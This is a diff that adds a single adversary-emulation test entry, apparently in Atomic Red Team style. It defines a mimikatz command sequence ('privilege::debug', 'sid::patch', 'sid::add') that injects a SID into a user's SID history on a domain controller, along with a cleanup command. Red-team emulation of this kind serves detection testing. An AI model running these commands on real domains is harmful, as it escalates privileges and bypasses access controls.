@@ -1,0 +1,19 @@
+- description: 'Adversaries may use SID-History Injection to escalate privileges and
+    bypass access controls. Must be run on domain controller
+
+    '
+  id: 890e9d62-e709-6b70-848c-7909396cee72
+  name: Injection SID-History with mimikatz
+  platforms:
+    windows:
+      cmd:
+        cleanup: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+          "sid::clear /sam:$env:username" "exit"
+        command: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+          "privilege::debug" "sid::patch" "sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134
+          /sam:$env:username" "exit"
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1134.005
+    name: 'Access Token Manipulation: SID-History Injection'
